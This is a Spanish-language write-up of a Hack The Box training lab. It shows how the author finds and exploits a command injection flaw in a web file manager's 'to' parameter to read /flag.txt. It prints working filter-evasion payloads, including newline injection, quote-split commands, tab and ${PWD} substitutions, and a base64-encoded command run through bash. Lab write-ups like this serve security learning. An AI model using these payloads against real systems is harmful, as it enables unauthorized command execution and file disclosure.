--- 
title: "Laboratorio de Command Injection"  
date: 2025-09-10
tags: [hackthebox, File Injection]
categories: ["Hack the Box", "File Injection"]
summary: "En este laboratorio exploramos una vulnerabilidad de Command Injection en una aplicación web de gestión de archivos. Mediante inyección de comandos, logramos ejecutar comandos del sistema, listar directorios y finalmente leer el contenido de la flag."
draft: false 

---
![](../../../../../images/Miniaturas/file_upload.pn)
#### Enunciado
Le contratan para realizar una prueba de penetración para una empresa y, durante la prueba, descubre una interesante aplicación web de gestión de archivos. Dado que los gestores de archivos suelen ejecutar comandos del sistema, le interesa comprobar si existen vulnerabilidades de inyección de comandos.

Utilice las distintas técnicas presentadas en este módulo para detectar una vulnerabilidad de inyección de comandos y luego explotarla, evadiendo cualquier filtro existente.
- Autenticarse con el usuario `guest` y la contraseña `guest`.

**¿Cuál es el contenido de '/flag.txt'?**
Accedemos a la página web que nos ponen.
![](../../../../../images/HTB_modulos/Command_injection_lab_1/flag_1-1.png)
Entramos con las credenciales que nos dan y vemos lo siguiente un administrador de archivos.
![](../../../../../images/HTB_modulos/Command_injection_lab_1/flag_1-2.png)
Revisando la página vemos que la petición:
![](../../../../../images/HTB_modulos/Command_injection_lab_1/flag_1-3.png)
![](../../../../../images/HTB_modulos/Command_injection_lab_1/flag_1-4.png)
![](../../../../../images/HTB_modulos/Command_injection_lab_1/flag_1-5.png)
Nos da un error luego de probar con diferentes comandos vemos que en el parámetro `to` es vulnerable a inyección de comandos.

to=`%0ap'w'd`...   -> `/n pwd`
Probamos con el comando `pwd` y vemos que nos muestra la ruta actual.
![](../../../../../images/HTB_modulos/Command_injection_lab_1/flag_1-6.png)

to=`%0a'l's%09${PWD:0:1}`...   -> `/n ls /`
Listamos el contenido en `/` y vemos el archivo de la flag.

![](../../../../../images/HTB_modulos/Command_injection_lab_1/flag_1-7.png)

to=`%0a'ca't%09${PWD:0:1}flag.txt`...  -> `/n cat /flag.txt`.
Leemos la flag.
![](../../../../../images/HTB_modulos/Command_injection_lab_1/flag_1-8.png)

Otra forma que tenemos de hacerlo es codificando los comandos en base 64 y pasárselo para que el servidor lo decodifique.

to=`%0abash<<<$(base64%09-d<<<Y2F0IC9mbGFnLnR4dA==)` -> `/n cat /flag.txt`

Si te sirvió de algo este tutorial ya para mi es más que suficiente, si me puedes decir en que podemos mejorar te lo voy a agradecer un montón.